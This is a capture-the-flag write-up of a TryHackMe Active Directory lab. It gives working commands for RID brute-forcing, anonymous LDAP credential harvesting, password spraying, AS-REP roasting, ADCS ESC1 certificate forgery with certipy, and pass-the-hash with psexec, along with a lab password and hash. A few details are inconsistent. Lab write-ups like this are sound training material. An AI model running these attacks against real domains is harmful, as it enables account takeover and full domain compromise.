# TryHackMe — Ledger | Full Writeup

**Room:** <https://tryhackme.com/room/ledger>  
**Difficulty:** Hard  
**OS:** Windows (Active Directory domain controller)

Ledger is an Active Directory box built around AD CS misconfiguration. There's no direct foothold on any listening service — the path in comes entirely from anonymous AD enumeration: RID brute-forcing to build a full user list, an anonymous LDAP bind that leaks a password sitting in a user's description field, and a spray of that password across the domain. From there, BloodHound maps out RDP access and a second local user worth chasing, and the actual privilege escalation comes from an ESC1-vulnerable certificate template that lets a low-privileged user mint a certificate for another account and convert it into that account's NTLM hash.

---

## 1. Reconnaissance

```
nmap $IP -p- --open -sV -sC
```

```
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Active Directory LDAP (Domain: thm.local)
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  ssl/ldap
3268/tcp open  ldap
3269/tcp open  ssl/ldap
3389/tcp open  ms-wbt-server
```

A standard domain controller footprint: DNS, Kerberos, LDAP on both plaintext and SSL ports, SMB, and RDP. Certificate metadata on 443 and the LDAPS ports names the domain `thm.local`, hostname `labyrinth.thm.local`, and a CA called `thm-LABYRINTH-CA` — that CA name becomes relevant much later. No WinRM is listening, so any shell has to come through SMB or RDP.

---

## 2. SMB — Anonymous and Guest Access

```
netexec smb $IP -u 'Guest' -p '' --shares
```

```
[+] thm.local\Guest:
Share      Permissions  Remark
ADMIN$                  Remote Admin
C$                      Default share
IPC$       READ         Remote IPC
NETLOGON                Logon server share
SYSVOL                  Logon server share
```

Guest authentication is accepted, but only the default shares are exposed and none of them are readable beyond `IPC$`. Nothing to pull here directly — the guest session is useful for what it lets us *enumerate*, not for file access.

---

## 3. HTTP — IIS Fingerprinting (Dead End)

```
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/big.txt -t 40
```

```
/aspnet_client   (Status: 301)
```

Recursing into `/aspnet_client` with ffuf surfaces a `system_web` subfolder. The specific version folders under `aspnet_client/system_web/` are a known IIS information-disclosure quirk — their presence or absence reveals which .NET Framework versions are installed, since each version ships its own folder. It's a legitimate fingerprinting technique, but on this box it doesn't lead anywhere: both HTTP and HTTPS return 403 everywhere else, and there's no further web attack surface to chase. This turns out to be a dead end — the real path is entirely through AD.

---

## 4. RID Brute-Forcing and Failed Kerberos Attacks

With only a guest session, the fastest way to build a real target list is RID cycling against SMB:

```
netexec smb $IP -u 'Guest' -p '' --rid-brute
```

```
grep "SidTypeUser" users.txt | cut -d '\' -f2 | cut -d ' ' -f1 > newusers.txt
```

This returns a large list of domain usernames. With a username list in hand, both AS-REP roasting and Kerberoasting were attempted against every user with no credentials — both come back empty. Neither technique works without at least one of: an account with Kerberos pre-auth disabled, or an account holding an SPN, and RID brute-forcing alone doesn't reveal which (if any) accounts qualify. Another dead end, for now.

---

## 5. Anonymous LDAP — Credential Leak via Description Field

```
ldapsearch -x -H ldap://$IP -b "dc=thm,dc=local" > ldapsearch.txt
```

```
cat ldapsearch.txt | grep description
```

Anonymous LDAP binds are allowed, and dumping the full directory tree exposes user object attributes — including `description` fields. Admins sometimes use this field as an informal notes box, and on this box one of those notes contains a plaintext password. This is the actual foothold: not a service exploit, just an over-permissioned anonymous LDAP query against a field nobody thinks to lock down.

---

## 6. Password Spray

The recovered password was sprayed across the full RID-brute'd user list:

```
netexec smb $IP -u newusers.txt -p 'CHANGEME2023!' --continue-on-success
```

Two accounts come back valid: **IVY_WILLIS** and **SUSANNA_MCKNIGHT**, both using the same password. That single leaked credential is reused across multiple accounts — a common real-world pattern this box is deliberately reproducing.

---

## 7. BloodHound Collection and a Second AS-REP Attempt

With authenticated LDAP access, a full BloodHound collection becomes possible:

```
netexec ldap labyrinth.thm.local -u IVY_WILLIS -p 'CHANGEME2023!' --bloodhound --dns-server $IP -c all
```

AS-REP roasting was retried, this time authenticated:

```
netexec ldap labyrinth.thm.local -u IVY_WILLIS -p 'CHANGEME2023!' --asreproast hash.txt
```

This pulls back five `$krb5asrep$` hashes for accounts with pre-auth disabled. None of them crack against a standard wordlist — another rabbit hole. The real next step comes from BloodHound's graph, not from cracking.

---

## 8. RDP Access — User Flag

Testing the two valid accounts against RDP (rather than just SMB) shows **SUSANNA_MCKNIGHT** has an active session right:

```
xfreerdp /u:SUSANNA_MCKNIGHT /p:'CHANGEME2023!' /v:$IP
```

BloodHound confirms why — Susanna sits in the **Remote Desktop Users** group. Logging in over RDP reaches the desktop and the user flag. Browsing the local user profiles also reveals a second account, **Bradley_Ortiz**, that doesn't appear anywhere in the credentials gathered so far — worth tracking in BloodHound, since a graph edge connects to it that looks worth chasing once there's a working privilege-escalation primitive.

---

## 9. Privilege Escalation — ADCS ESC1

The certificate authority spotted during recon (`thm-LABYRINTH-CA`) turns out to be the actual privesc vector. Certipy enumerates certificate templates for anything an authenticated low-privilege user can abuse:

```
certipy-ad find -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' -dc-ip $IP -target thm.local -vulnerable -enabled
```

A template comes back flagged **vulnerable to ESC1** — client authentication is enabled, enrollee-supplied subject is allowed, and low-privileged users hold enrollment rights. That combination means anyone who can enroll can request a certificate on behalf of *any other account*, simply by setting the UPN in the request.

```
certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' \
  -ca 'thm-LABYRINTH-CA' \
  -template 'ServerAuth' \
  -upn 'administrator@thm.local' \
  -dc-ip $IP \
  -target labyrinth.thm.local
```

The request succeeds and returns a certificate mapped to `administrator@thm.local`. Converting that certificate into an NT hash via Certipy's PKINIT authentication returns a hash — but it belongs to a different Domain Admin account entirely and doesn't authenticate cleanly against the DC, most likely due to strict certificate-mapping enforcement on that particular account.

The working path turns out to be requesting the same ESC1 abuse against **Bradley_Ortiz** — the second local account spotted earlier during the RDP session — instead of the built-in Administrator. That request goes through cleanly and Certipy resolves it to Bradley's NTLM hash.

---

## 10. Pass-the-Hash — Full Compromise

RDP with just the certificate-derived hash proved unreliable, but SMB-based execution worked without issue:

```
impacket-psexec thm.local/bradley_ortiz@labyrinth.thm.local \
  -hashes aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d
```

This drops a SYSTEM shell on the domain controller — full compromise of `labyrinth.thm.local`.

---

## Attack Chain

```
nmap ($IP → DC footprint: 53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389)
  └─→ SMB guest session → shares present but empty
  └─→ HTTP → aspnet_client fingerprint (dead end)
  └─→ RID brute-force (guest) → full domain user list
        └─→ AS-REP roast / Kerberoast (no creds) → nothing
              └─→ Anonymous LDAP dump → description field → CHANGEME2023!
                    └─→ Password spray → IVY_WILLIS, SUSANNA_MCKNIGHT valid
                          └─→ BloodHound collection (authenticated)
                          └─→ AS-REP roast (authenticated) → 5 hashes, none crack
                                └─→ RDP check → Susanna in Remote Desktop Users
                                      └─→ RDP as Susanna → user flag
                                      └─→ Bradley_Ortiz profile spotted, BloodHound edge noted
                                            └─→ certipy find → ESC1-vulnerable template
                                                  └─→ certipy req (UPN administrator) → hash doesn't auth
                                                  └─→ certipy req (UPN bradley_ortiz) → working NT hash
                                                        └─→ impacket-psexec (pass-the-hash) → SYSTEM on DC
```

---

## Key Concepts

| Concept | Explanation |
|---|---|
| **RID brute-forcing over SMB** | Windows assigns sequential Relative IDs to security principals. Even with only a guest/null session, cycling through RID ranges via `lookupsid`-style requests enumerates real usernames without needing any directory query rights. |
| **Anonymous LDAP binds** | If LDAP allows unauthenticated (anonymous) simple binds, the entire directory schema — including free-text fields like `description` — becomes readable to anyone on the network. Admins occasionally leave passwords, hints, or ticket references in these fields, turning a misconfiguration into a direct credential leak. |
| **Password spraying vs. brute-forcing** | Spraying tries one password against many usernames instead of many passwords against one, which avoids account lockout thresholds while still catching password reuse across accounts — exactly what happened here with two separate users sharing a credential. |
| **AS-REP / Kerberoasting prerequisites** | Both attacks depend on specific account properties (pre-auth disabled, or an SPN registered) that a plain username list doesn't reveal. A first attempt returning nothing doesn't rule the technique out — it just means the right account hasn't been identified yet. |
| **BloodHound for path-finding, not just group membership** | Beyond confirming who's in what group, BloodHound's edges (like the one pointing at Bradley_Ortiz) are what tell you which of several valid accounts is actually worth pursuing next, instead of guessing. |
| **AD CS ESC1** | A certificate template that allows client authentication, lets the requester supply their own subject/UPN, and grants enrollment rights to low-privileged users is a direct impersonation primitive — anyone who can enroll can request a certificate claiming to be any other account in the domain. |
| **Certificate-to-hash conversion (PKINIT)** | Once a certificate mapped to a target account exists, Certipy can use it to perform Kerberos PKINIT authentication and recover that account's NT hash — turning a certificate abuse into a standard credential the attacker can reuse elsewhere. |
| **Strong certificate mapping** | Some accounts, particularly high-value ones like the built-in Administrator, may be protected by strict certificate-to-account mapping enforcement, causing an otherwise valid ESC1 certificate to fail authentication. When one target account doesn't work, the same technique against a less-protected account often does. |
| **Pass-the-hash with psexec vs. RDP** | RDP typically requires an interactive password or a properly configured Restricted Admin mode to accept a hash; SMB-based execution (`psexec`) accepts NTLM hashes directly for authentication, making it the more reliable choice once a hash — rather than a plaintext password — is all that's available. |

---

## Flags

| Flag | Path | Value |
|---|---|---|
| User flag | Susanna's desktop (RDP session) 
| Root / DA flag | via SYSTEM shell on `labyrinth.thm.local` 
